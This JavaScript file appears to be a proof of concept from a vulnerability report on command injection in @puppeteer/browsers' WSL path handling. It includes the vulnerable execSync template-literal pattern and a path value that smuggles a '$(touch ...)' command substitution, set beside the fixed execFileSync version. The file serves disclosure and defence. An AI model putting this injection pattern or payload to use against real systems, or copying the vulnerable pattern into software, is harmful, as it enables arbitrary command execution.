/**
 * PoC 2 — Command Injection via WSL path in @puppeteer/browsers
 *
 * Vulnerability: packages/browsers/src/browser-data/chrome.ts  getWslLocation()
 * Line 241 (pre-fix):
 *   return execSync(`wslpath "${path}"`).toString().trim();
 *
 * Root cause:
 *   `path` is a Windows filesystem path resolved from a Windows environment
 *   variable (PROGRAMFILES, LOCALAPPDATA, etc.) via cmd.exe.  The value is
 *   interpolated directly into a shell command string passed to execSync(),
 *   which spawns /bin/sh.  Double-quote meta-characters in the path are not
 *   escaped, allowing an attacker who controls the Windows environment
 *   (e.g. a compromised Windows host sharing WSL, or a user-controlled
 *   .env / registry hive) to break out of the quoted argument and execute
 *   arbitrary commands with the same privileges as the Node.js process.
 *
 * Attack scenario (WSL):
 *   Attacker sets the Windows environment variable PROGRAMFILES to:
 *     C:\Program Files"$(touch /tmp/pwned_by_puppeteer)"
 *
 *   The interpolated command becomes:
 *     wslpath "C:\Program Files"$(touch /tmp/pwned_by_puppeteer)"\..."
 *
 *   /bin/sh interprets $(touch /tmp/pwned_by_puppeteer) as a command
 *   substitution and executes it before wslpath even runs.
 *
 * Impact:
 *   Arbitrary command execution on the WSL host with the Node.js process
 *   privileges whenever a caller invokes getBrowserPath() for Chrome inside
 *   WSL (e.g. puppeteer.executablePath(), browser.launch(), etc.).
 *
 * Fixed in:  commit 174ad20 — replaced execSync+template-literal with
 *            execFileSync('wslpath', [path]) (no shell involved).
 *
 * Google VRP scope: puppeteer/puppeteer (open-source, ~40 million weekly npm downloads)
 */

import {execSync, execFileSync} from 'node:child_process';
import {existsSync, unlinkSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {join} from 'node:path';

const SENTINEL = join(tmpdir(), 'puppeteer_pwned_poc2');

// Clean up any leftover sentinel from a previous run
if (existsSync(SENTINEL)) unlinkSync(SENTINEL);

console.log('='.repeat(60));
console.log('PoC 2 — Command Injection via WSL wslpath shell interpolation');
console.log('='.repeat(60));
console.log('');
console.log('Simulating what happens when PROGRAMFILES contains:');
console.log(`  C:\\Program Files"$(touch ${SENTINEL})"`);
console.log('');

// ── Reproduce the VULNERABLE code pattern (pre-fix) ───────────────────────────
function vulnerableWslpath(path) {
  // This is the exact pre-fix line from chrome.ts:241
  return execSync(`wslpath "${path}"`).toString().trim();
}

// ── Reproduce the SAFE code pattern (post-fix) ────────────────────────────────
function safeWslpath(path) {
  return execFileSync('wslpath', [path]).toString().trim();
}

// ── Check if wslpath is available (only present in WSL) ──────────────────────
let wslpathAvailable = false;
try {
  execFileSync('wslpath', ['C:\\'], {stdio: ['ignore', 'pipe', 'ignore']});
  wslpathAvailable = true;
} catch {
  // Not in WSL — we'll simulate the injection with /bin/echo instead
}

if (wslpathAvailable) {
  // ─── Real WSL environment ───────────────────────────────────────────────
  console.log('[ENV] Running inside WSL — using real wslpath');
  console.log('');

  // Malicious path: the injected payload creates the sentinel file
  const maliciousPath = `C:\\Windows"$(touch ${SENTINEL})"`;

  console.log('[1/2] Calling VULNERABLE function ...');
  try {
    vulnerableWslpath(maliciousPath);
  } catch {
    // wslpath may error on the malformed path — injection still fires first
  }

  if (existsSync(SENTINEL)) {
    console.log(`✗  VULNERABLE — sentinel created: ${SENTINEL}`);
    unlinkSync(SENTINEL);
  } else {
    console.log('✓  Shell did not execute the injection (unexpected)');
  }

  console.log('');
  console.log('[2/2] Calling SAFE function (execFileSync with array args) ...');
  try {
    safeWslpath(maliciousPath);
  } catch {
    // expected — wslpath rejects the malformed path cleanly
  }

  if (existsSync(SENTINEL)) {
    console.log(`✗  STILL VULNERABLE — sentinel created: ${SENTINEL}`);
  } else {
    console.log('✓  PROTECTED — no code execution, wslpath received the raw string');
  }
} else {
  // ─── Non-WSL environment — demonstrate the shell-splitting with /bin/sh ──
  console.log('[ENV] Not in WSL — demonstrating shell metachar injection via /bin/sh');
  console.log('');

  // Replicate the vulnerability with a generic shell command
  function vulnerableShellInterpolation(path) {
    // Same pattern as chrome.ts:241 but with 'echo' instead of 'wslpath'
    return execSync(`echo "${path}"`).toString().trim();
  }

  function safeShellEscape(path) {
    return execFileSync('echo', [path]).toString().trim();
  }

  const maliciousPath = `safe_prefix"$(touch ${SENTINEL})"`;

  console.log('[1/2] Calling VULNERABLE function (execSync with template literal) ...');
  console.log(`      path = ${maliciousPath}`);
  try {
    const out = vulnerableShellInterpolation(maliciousPath);
    console.log(`      stdout: ${out}`);
  } catch (e) {
    console.log(`      error (injection still fired): ${e.message}`);
  }

  if (existsSync(SENTINEL)) {
    console.log(`✗  VULNERABLE — command injection succeeded, sentinel created: ${SENTINEL}`);
    unlinkSync(SENTINEL);
  } else {
    console.log('(injection did not fire — shell may have been restricted)');
  }

  console.log('');
  console.log('[2/2] Calling SAFE function (execFileSync with array args) ...');
  console.log(`      path = ${maliciousPath}`);
  try {
    const out = safeShellEscape(maliciousPath);
    console.log(`      stdout: ${out}`);
  } catch (e) {
    console.log(`      error: ${e.message}`);
  }

  if (existsSync(SENTINEL)) {
    console.log(`✗  STILL VULNERABLE — sentinel created: ${SENTINEL}`);
  } else {
    console.log(`✓  PROTECTED — path treated as literal string, no subshell executed`);
  }
}

console.log('');
console.log('Affected call site (pre-fix):');
console.log('  packages/browsers/src/browser-data/chrome.ts:241');
console.log('  return execSync(`wslpath "${path}"`).toString().trim();');
console.log('');
console.log('Trigger condition:');
console.log('  Any call to getBrowserPath()/executablePath()/launch() for Chrome');
console.log('  inside a WSL environment where PROGRAMFILES or LOCALAPPDATA');
console.log('  contains shell metacharacters (attacker-controlled Windows env).');
